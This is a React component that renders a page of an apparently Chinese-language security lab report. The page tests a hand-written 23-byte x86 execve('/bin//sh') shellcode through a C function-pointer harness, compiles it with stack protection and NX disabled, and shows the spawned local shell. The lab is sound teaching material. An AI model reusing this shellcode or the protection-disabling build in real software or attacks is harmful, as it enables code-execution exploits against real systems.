import React from 'react';
import { A4Page, KaliTerminal, CodeBlock } from '../shared';

// 实验三 第五部分 - 测试 shellcode
export const Lab3Part5: React.FC = () => (
    <A4Page id="lab3-part5">
        <p className="text-sm mb-2">步骤6：编写 C 语言测试程序验证 Shellcode</p>
        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            为了验证我们提取的 shellcode 是否正确，需要编写一个 C 语言测试程序。
            该程序将 shellcode 存储在字符数组中，然后通过函数指针的方式执行这段机器码。
        </p>
        <CodeBlock title="shellcodetest.c">
{`#include <unistd.h>
#include <stdio.h>

void main() {
    // 手动编写的 23 字节 shellcode
    char* shellcode = "\\x31\\xc9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68"
                      "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\xb0"
                      "\\x0b\\xcd\\x80";
    
    // 将 shellcode 地址转换为函数指针并执行
    (*(void(*)())shellcode)();
}`}
        </CodeBlock>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            代码解析：(*(void(*)())shellcode)() 这行代码的含义是：首先将 shellcode 
            字符串的地址强制转换为一个无参数无返回值的函数指针类型 void(*)()，
            然后通过 * 解引用获取函数，最后通过 () 调用该函数。
        </p>

        <p className="text-sm mb-2">步骤7：编译测试程序</p>
        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            编译时需要添加特殊的编译选项来关闭现代操作系统的安全保护机制：
        </p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab3]
└─$ gcc -m32 -g -fno-stack-protector -z execstack shellcodetest.c -o shellcodetest`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            编译选项说明：-m32 生成 32 位代码；-g 保留调试信息；
            -fno-stack-protector 关闭栈保护（Canary）；
            -z execstack 允许栈上的代码执行（关闭 NX 保护）。
        </p>

        <p className="text-sm mb-2">步骤8：执行测试程序</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab3]
└─$ ./shellcodetest
$ whoami
kali
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
$ pwd
/home/kali/lab3
$ ls
funcall  funcall.c  shellcode  shellcode.asm  shellcode.c  shellcode1  shellcodetest  shellcodetest.c
$ exit`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            测试程序成功执行了我们手动编写的 shellcode，获取了一个可交互的 shell 环境。
            通过 whoami 和 id 命令可以确认当前用户身份，通过 ls 命令可以查看当前目录文件。
            这证明了我们提取的 23 字节 shellcode 是正确有效的。
        </p>

        <p className="text-sm mb-2">步骤9：查看实验文件列表</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab3]
└─$ ls -la
total 96
drwxr-xr-x  2 kali kali  4096 Dec 29 10:18 .
drwx------ 22 kali kali  4096 Dec 29 10:11 ..
-rwxr-xr-x  1 kali kali 16212 Dec 29 10:18 funcall
-rw-r--r--  1 kali kali   203 Dec 29 10:14 funcall.c
-rwxr-xr-x  1 kali kali 14992 Dec 29 10:17 shellcode
-rwxr-xr-x  1 kali kali  4488 Dec 29 10:17 shellcode1
-rw-r--r--  1 kali kali   203 Dec 29 10:14 shellcode.asm
-rw-r--r--  1 kali kali   120 Dec 29 10:14 shellcode.c
-rw-r--r--  1 kali kali   448 Dec 29 10:17 shellcode.o
-rw-r--r--  1 kali kali   100 Dec 29 10:14 shellcode_pwntools.py
-rwxr-xr-x  1 kali kali 15876 Dec 29 10:18 shellcodetest
-rw-r--r--  1 kali kali   205 Dec 29 10:17 shellcodetest.c`}
        </KaliTerminal>
    </A4Page>
);

export default Lab3Part5;
